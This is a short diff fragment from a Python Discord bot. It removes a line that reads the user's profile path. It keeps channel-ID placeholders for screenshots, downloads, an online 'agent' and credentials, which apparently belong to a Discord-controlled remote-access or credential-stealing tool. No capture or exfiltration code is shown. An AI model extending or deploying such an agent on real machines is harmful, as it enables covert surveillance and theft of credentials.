@@ -30,7 +30,6 @@ SCREENSHOTS_ID = {SCREENSHOTS_ID}
 DOWNLOADS_ID = {DOWNLOADS_ID}
 AGENT_ONLINE_ID = {AGENT_ONLINE_ID}
 CREDENTIALS_ID = {CREDENTIALS_ID}
-USER_PROFILE = os.environ["USERPROFILE"]
 
 client = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_command=None)
 
